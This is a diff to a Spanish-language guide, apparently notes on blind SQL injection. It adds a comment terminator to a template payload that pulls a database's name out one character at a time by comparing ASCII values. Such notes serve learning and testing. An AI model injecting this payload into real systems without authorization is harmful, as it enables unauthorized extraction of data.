@@ -29,7 +29,7 @@ En este caso buscamos un campo donde podamos validar una respuesta. Luego buscam
 
 ### Dumpear el nombre de una DB:
 
-        <dato>’ AND ASCII(SUBSTR(DATABASE(),<index>,X))=<Valor ASCII>
+        <dato>’ AND ASCII(SUBSTR(DATABASE(),<index>,X))=<Valor ASCII>-- -
 
         
 ### Dumpear los caracteres dentro de un campo
